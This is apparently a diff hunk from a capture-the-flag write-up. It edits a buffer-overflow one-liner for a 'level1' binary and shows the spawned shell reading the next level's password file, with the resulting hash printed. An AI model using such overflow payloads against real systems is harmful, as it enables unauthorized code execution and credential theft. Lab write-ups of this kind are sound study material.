@@ -200,7 +200,7 @@ But because we ran the program with the input coming from a pipeline, the input 
 
 To work around this issue we can keep the `stdin` open like this:
 ```bash
-$ ( printf "%-76s\x44\x84\x04\x08\n" | tr ' ' '\0' ; cat ) | ./level1
+$ ( printf "%-76s\x44\x84\x04\x08\n" ; cat ) | ./level1
 Good... Wait what?
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
